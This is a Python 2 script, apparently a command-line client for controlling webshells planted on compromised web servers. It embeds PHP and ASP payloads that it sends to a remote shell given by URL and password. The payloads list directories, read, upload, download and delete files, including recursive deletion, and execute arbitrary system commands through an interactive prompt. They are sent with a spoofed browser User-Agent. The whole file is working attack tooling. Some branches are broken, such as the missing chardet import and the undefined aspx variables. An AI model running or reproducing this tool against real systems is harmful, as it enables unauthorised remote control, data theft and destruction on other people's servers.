#!/usr/bin/env python
#encoding:utf-8
import urllib
import base64
import sys
import binascii
import urllib2
import optparse

session_url='http://127.0.0.1/test.php'
session_pwd='cmd'
session_type='php'
session_user=''
session_dir=''
session_cmd=''
session_encoding=''

def getencode():
    data1 = urllib.urlopen(session_url).read()
    chardit1 = chardet.detect(data1)
    return chardit1['encoding']

def functions():
    print "\033[;31m**********************************************************"
    print "\033[;31mls    [dir]             列目录\033[1;m"
    print "\033[;31mcat   [file]            查看文件\033[1;m"
    print "\033[;31mup    [local] [remote]  上传 \033[1;m"
    print "\033[;31mdown  [remote] [local]  下载\033[1;m"
    print "\033[;31mdel   [file]            删除\033[1;m"
    print "\033[;31mcmd                     命令行\033[1;m"
    print "\033[;31mpwd                     会话路径\033[1;m"
    print "\033[;31mwhoami                  会话用户\033[1;m"
    print "\033[;31mhelp                    帮助 \033[1;m"
    print "\033[;31mexit                    退出\033[1;m"
    print "\033[;31m**************************************************************\033[1;m"




php_info=r'''
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$D=dirname($_SERVER["SCRIPT_FILENAME"]);
if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);
$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(range("A","Z") as $L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\t";
$u=(function_exists("posix_getegid"))?@posix_getpwuid(@posix_geteuid()):"";
$usr=($u)?$u["name"]:@get_current_user();
$R.=php_uname();
$R.="({$usr})";
print $R;
echo("|<-");die();'''


php_dir=r'''
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$D=$_POST["z1"];    
$F=@opendir($D);
if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}
else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));
@$E=substr(base_convert(@fileperms($P),10,8),-4);
$R="\t".$T."\t".@filesize($P)."\t".$E."\n";
if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}
echo $M.$L;@closedir($F);};
echo("|<-");die();
'''


php_upload=r'''
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$f=$_POST["z1"];   
$c=$_POST["z2"];    
$c=str_replace("\r","",$c);
$c=str_replace("\n","",$c);
$buf="";
for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));
echo(@fwrite(fopen($f,"w"),$buf)?"1":"0");
echo("|<-");
die();
'''



php_download=r'''
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$F=get_magic_quotes_gpc()?stripslashes(base64_decode($_POST["z1"])):base64_decode($_POST["z1"]);
$fp=@fopen($F,"r");
if(@fgetc($fp)){@fclose($fp);@readfile($F);}else{echo("ERROR:// Can Not Read");};
echo("|<-");
die();
'''

php_readfile=r'''
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$F=base64_decode($_POST["z1"]);
$P=@fopen($F,"r");
echo(@fread($P,filesize($F)));
@fclose($P);
echo("|<-");
die();
'''


php_del=r'''
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
function df($p)
{$m=@dir($p);
while(@$f=$m->read())
{$pf=$p."/".$f;
if((is_dir($pf))&&($f!=".")&&($f!=".."))
{@chmod($pf,0777);df($pf);}
if(is_file($pf))
{@chmod($pf,0777);@unlink($pf);}}
$m->close();
@chmod($p,0777);
return @rmdir($p);}
$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];
if(is_dir($F))echo(df($F));
else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};
echo("|<-");
die();
'''

php_cmd=r'''
@ini_set("display_errors","0");
@set_time_limit(0);
@set_magic_quotes_runtime(0);
echo("->|");
$d=dirname($_SERVER["SCRIPT_FILENAME"]);
if(substr($d,0,1)=="/"){$p="/bin/sh";}else($p=base64_decode($_POST["z1"]));
$s=base64_decode($_POST["z2"]);
$d=dirname($_SERVER["SCRIPT_FILENAME"]);
$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";
$r="{$p} {$c}";
@system($r." 2>&1",$ret);
print ($ret!=0)?"ret={$ret}":"";
echo("|<-");
die();
'''


asp_upload=r'''
response.write "->|"
Function bd(byVal s)
For i=1 To Len(s) Step 2
c=Mid(s,i,2)
If IsNumeric(Mid(s,i,1)) Then
bd=bd&chr("&H"&c)
Else
bd=bd&chr("&H"&c&Mid(s,i+2,2))
i=i+2
End If 
Next
End Function
On Error Resume Next
Dim l,ss,ff,T
ff=bd(request("z1"))
ss=Request("z2")
l=Len(ss)
Set S=Server.CreateObject("Adodb.Stream")
With S
.Type=1
.Mode=3
.Open
If Request("z3")>0 Then
.LoadFromFile ff
.Position=.Size
End If
set rs=CreateObject("ADODB.Recordset")
rs.fields.append "bb",205,l/2
rs.open:rs.addnew
rs("bb")=ss+chrb(0)
rs.update
.Write rs("bb").getchunk(l/2)
rs.close
Set rs=Nothing
.Position=0
.SaveToFile ff,2
.Close
End With
Set S=Nothing
If Err Then
T=Err.Description
Err.Clear
Else
T="ok"
End If
Response.Write(T)
response.write "|<-"
'''


asp_download=r'''
response.write "->|"
On Error Resume Next
Dim i,c,r
Set S=Server.CreateObject("Adodb.Stream")
If Not Err Then
With S
.Mode=3
.Type=1
.Open
.LoadFromFile(Request("z1"))
i=0
c=.Size
r=1024
While i<c
Response.BinaryWrite .Read(r)
Response.Flush
i=i+r
Wend
.Close
Set S=Nothing
End With
Else
Response.BinaryWrite "ERROR:// "&Err.Description
End If
response.write "|<-"
'''

asp_readfile=r'''
response.write "->|"
On Error Resume Next
Response.Write(CreateObject("Scripting.FileSystemObject").OpenTextfile(Request("z1"),1,False).readall)
If Err Then
Response.Write("ERROR:// "&Err.Description)
Err.Clear
End If
response.write "|<-"
'''


asp_del=r'''
On Error Resume Next
Dim P
P=Request("z1")
Set FS=CreateObject("Scripting.FileSystemObject")
If FS.FolderExists(P)=true Then
FS.DeleteFolder(P)
Else
FS.DeleteFile(P)
End If
Set FS=Nothing
If Err Then
S="ERROR:// "&Err.Description
Else
S="1"
Response.Write("->|")
Response.Write(S)
Response.Write("|<-")
End If
'''


asp_cmd=r'''
response.write "->|"
On Error Resume Next
Set X=CreateObject("wscript.shell").exec(""""&Request("z1")&""" /c """&Request("z2")&"""")
If Err Then
S="[Err] "&Err.Description
Err.Clear
Else
O=X.StdOut.ReadAll()
E=X.StdErr.ReadAll()
S=O&E
End If
Response.write(S)
response.write "|<-"
'''


asp_dir=r'''
response.write "->|"
On Error Resume Next
Dim RR
RR=Request("z1")
Function FD(dt)
FD=Year(dt)&"-"
If Len(Month(dt))=1 Then
FD = FD&"0"
End If
FD=FD&Month(dt)&"-"
If Len(Day(dt))=1 Then
FD=FD&"0"
End If
FD=FD&Day(dt)&" "&FormatDateTime(dt,4)&":"
If Len(Second(dt))=1 Then
FD=FD&"0"
End If
FD=FD&Second(dt)
End Function
SET C=CreateObject("Scripting.FileSystemObject")
Set FO=C.GetFolder(""&RR&"")
If Err Then
Response.Write("ERROR:// "&Err.Description)
Err.Clear
Else
For Each F in FO.subfolders
Response.Write F.Name&chr(47)&chr(9)&FD(F.DateLastModified)&chr(9)&chr(48)&chr(9)&C.GetFolder(F.Path).attributes&chr(10)
Next
For Each L in FO.files
Response.Write L.Name&chr(9)&FD(L.DateLastModified)&chr(9)&L.size&chr(9)&C.GetFile(L.Path).attributes&chr(10)
Next
End If
response.write "|<-"
'''

asp_info=r'''
response.write "->|"
On Error Resume Next
Dim S
S=Server.Mappath(".")&chr(9)
SET C=CreateObject("Scripting.FileSystemObject")
If Err Then
Err.Clear
Else
For Each D in C.Drives
S=S&D.DriveLetter&chr(58)
Next
End If
Response.Write(S)
response.write "|<-"
'''


def viewdir(dir):
    print dir
    
    #dir=base64.b64encode(directory)
    #print session_url
    #print session_pwd
    #print php_dirlist_code
    if(session_type=='php'):
        data={session_pwd:binascii.b2a_hex(php_dir),'z1':dir}
    elif(session_type=='aspx'):
        data={session_pwd:code1+str(bgcode)+code2+base64.b64encode(aspx_dirlist_code)+code3,'z1':dir}
    else:
        data={session_pwd:binascii.b2a_hex(asp_dir),'z1':dir}        
        
 
    
    data=urllib.urlencode(data)
    req=urllib2.Request(session_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
    response = urllib2.urlopen(req,data)
    content=response.read().decode(session_encoding).encode('utf-8')
    num1=content.find('->|')+3
    num2=content.find('|<-')
    info=content[num1:num2]
    print info

def upload(localfile,remotefile):
    
    try:
        f=file(localfile,'rb')
        content=binascii.b2a_hex(f.read())
        f.close()
    except Exception,e:
        print 'upload error:',e
	return
    if(session_type=='php'):
        data={session_pwd:binascii.b2a_hex(php_upload),'z1':remotefile,'z2':content}
        data=urllib.urlencode(data)
        req=urllib2.Request(session_url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
        response = urllib2.urlopen(req,data)
        content=response.read().decode(session_encoding).encode('utf-8')
        num1=content.find('->|')+3
        num2=content.find('|<-')
        info=content[num1:num2]
        '''print info'''
        if(info=='1'):
            print "upload success!"
        else:
            print "upload error!"

    elif(session_type=='aspx'):
        data={session_pwd:code1+str(bgcode)+code2+base64.b64encode(aspx_upload_code)+code3,'z1':base64.b64encode(uploadfile),'z2':content}
    else:
        asp_upload_hex=binascii.b2a_hex(asp_upload)
        remotefile_hex=binascii.b2a_hex(remotefile)
        length=len(content)
        temp=0
        while temp<length:
            #print s[temp:temp+46000]
            
            data={session_pwd:binascii.b2a_hex(asp_upload),'z1':binascii.b2a_hex(remotefile),'z2':content[temp:temp+46000],'z3':temp/2}

            temp=temp+46000
            data=urllib.urlencode(data)
            req=urllib2.Request(session_url)
            req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
            response = urllib2.urlopen(req,data)
            webcontent=response.read().decode(session_encoding).encode('utf-8')
            #print webcontent
            num1=webcontent.find('->|')+3
            num2=webcontent.find('|<-')
            info=webcontent[num1:num2]
            '''print info'''
            if(info=='ok'):
                print "upload success!"
            else:
                print "upload error!"
                break


def download(remotefile,localfile):
    
    
    #print session_url
    #print session_pwd
    #print php_dirlist_code
    if(session_type=='php'):
        data={session_pwd:binascii.b2a_hex(php_download),'z1':base64.b64encode(remotefile)}
    elif(session_type=='aspx'):
        data={session_pwd:code1+str(bgcode)+code2+base64.b64encode(aspx_upload_code)+code3,'z1':remotefile}
    else:
        data={session_pwd:binascii.b2a_hex(asp_download),'z1':remotefile}     
    data=urllib.urlencode(data)
    req=urllib2.Request(session_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
    response = urllib2.urlopen(req,data)
    content=response.read().decode(session_encoding).encode('utf-8')
    num1=content.find('->|')+3
    num2=content.find('|<-')
    info=content[num1:num2]
    #print info
    try:
        f=file(localfile,'wb')
        f.write(info)
        f.close
    except Exception,e:
        print "download error:",e
	return
    if info.find('ERROR://')==0 or len(info.strip())==0:
        print 'download error!'
    else:
        print 'download success!'

def readfile(filename):
    
    
    if(session_type=='php'):
        data={session_pwd:binascii.b2a_hex(php_readfile),'z1':base64.b64encode(filename)}
    elif(session_type=='aspx'):
        data={session_pwd:code1+str(bgcode)+code2+base64.b64encode(aspx_readfile_code)+code3,'z1':base64.b64encode(filename)}
    else:
        data={session_pwd:binascii.b2a_hex(asp_readfile),'z1':filename}     
    data=urllib.urlencode(data)
    req=urllib2.Request(session_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
    response = urllib2.urlopen(req,data)
    content=response.read().decode(session_encoding).encode('utf-8')
    num1=content.find('->|')+3
    num2=content.find('|<-')
    info=content[num1:num2]
    print info

def delfile(filename):
    
    
    #print session_url
    #print session_pwd
    #print php_dirlist_code
    if(session_type=='php'):
        data={session_pwd:binascii.b2a_hex(php_del),'z1':filename}
    elif(session_type=='aspx'):
        data={session_pwd:code1+str(bgcode)+code2+base64.b64encode(aspx_del_code)+code3,'z1':filename}
    else:
        data={session_pwd:binascii.b2a_hex(asp_del),'z1':filename}     
    data=urllib.urlencode(data)
    req=urllib2.Request(session_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
    response = urllib2.urlopen(req,data)
    content=response.read().decode(session_encoding).encode('utf-8')
    #print content
    num1=content.find('->|')+3
    num2=content.find('|<-')
    info=content[num1:num2]
    #print info
    if(info=='1'):
        print "ok!"
    else:
        print "error!"

def cmd(cmdbash="cmd.exe",command=""):
    global session_dir  
    global session_cmd
    global session_user
    
    session_cmd=cmdbash
    cmdbash1=base64.b64encode(session_cmd)
    if session_dir[0:1]=='/':
        command="cd "+session_dir+";"+command+';echo [directory];pwd;echo [/directory]'
    else:
        command="cd /d "+session_dir+"&"+command+'&echo [directory]&&cd&&echo [/directory]'
    command1=base64.b64encode(command)
    if(session_type=='php'):
        data={session_pwd:binascii.b2a_hex(php_cmd),'z1':cmdbash1,'z2':command1}
    #if(session_type=='aspx'):
      #  data={session_pwd:binascii.b2a_hex(php_cmd),'z1':cmdbash1,'z2':command1}
    else:
        #print "function_cmd:",cmdbash,command
        data={session_pwd:binascii.b2a_hex(asp_cmd),'z1':cmdbash,'z2':command}
    #print "func_cmd:",data
    data=urllib.urlencode(data)
    req=urllib2.Request(session_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
    response = urllib2.urlopen(req,data)

    content=response.read().decode(session_encoding).encode('utf-8')
    num1=content.find('->|')+3
    num2=content.find('|<-')
    num3=content.find('[directory]')
    num4=content.find('[/directory]')
    
    session_dir=content[num3+11:num4].strip()
    #print "directory:-------"+session_dir
    info=content[num1:num3].strip()
    print info
    while True:
        command=raw_input(session_dir+"@"+session_user+"$:")
        if command.strip()=='exit':
	    connected()
	else:
	    cmd(session_cmd,command)
     
def connected():
    global session_dir
    global session_user
    if(session_type=='php'):
        data={session_pwd:binascii.b2a_hex(php_info)}
    elif(session_type=='asp'):
        data={session_pwd:binascii.b2a_hex(asp_info)}
    else:
        data={session_pwd:asp_info}  
    data=urllib.urlencode(data)
    req=urllib2.Request(session_url)
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14')
    response = urllib2.urlopen(req,data)
    content=response.read().decode(session_encoding).encode('utf-8')
    num1=content.find('->|')+3
    num2=content.find('|<-')
    info=content[num1:num2]
    if len(info)>0:
        print "success,connected......."
        print "*****************************************************"
        print info
        functions()
        num3=info.find('\t')
        num4=info.find('(')
        num5=info.find(')')
        session_dir=info[0:num3]
        print "session_dir:",session_dir
        session_user=info[num4+1:num5].lower()
        if session_type=='asp':
            session_user='aspuser'
        print "session_user:",session_user
        while True:
            action=raw_input("input command>:").strip().split()
            if len(action)==0:
	        pass
	    elif len(action)==1 and action[0]=='?':
	        functions()
	    elif action[0]=='ls' or action[0]=='dir':
	        if len(action)==1:
		    viewdir(session_dir)
		else:
		    viewdir(action[1])
            elif action[0]=='cat':
                readfile(action[1])
            elif action[0]=='up':
                upload(action[1],action[2])
            elif action[0]=='down':
                download(action[1],action[2])
            elif action[0]=='del':
                delfile(action[1])
            elif action[0]=='cmd':
                if len(action)==1:
                    cmd()
                elif len(action)==2:
                    cmd(action[1])
                elif len(action)==3:
                    cmd(action[1],action[2]) 
		else:
		    pass
            elif action[0]=='help':
                functions()
            elif action[0]=='pwd':
	        print session_dir
	    elif action[0]=='whoami':
	        print session_user
	    elif action[0]=='exit':
                exit()
	    else:
	        pass

    else:
        print "failed,maybe something wrong! bye bye......"
        sys.exit(0)
    
       
if __name__=='__main__':
    if len(sys.argv)==1:
        print sys.argv[0],'-h for help'
        exit()
    parser = optparse.OptionParser()
    parser.add_option(
        '-u','--url',
        dest='url',
        help='the webshell url to be bind')
    parser.add_option(
        '-p','--password',
        dest='pwd',
        help='webshell password')
    parser.add_option(
        '-t','--type',dest='type',
        help='webshell type')
    parser.add_option(
        '-c','--encoding',dest='charset',
	help='webpage encoding,default gb2312',
        default='GB2312')
    options,args = parser.parse_args()
    session_url=options.url
    session_type=options.type
    session_pwd=options.pwd
    session_encoding=options.charset
    connected()
    

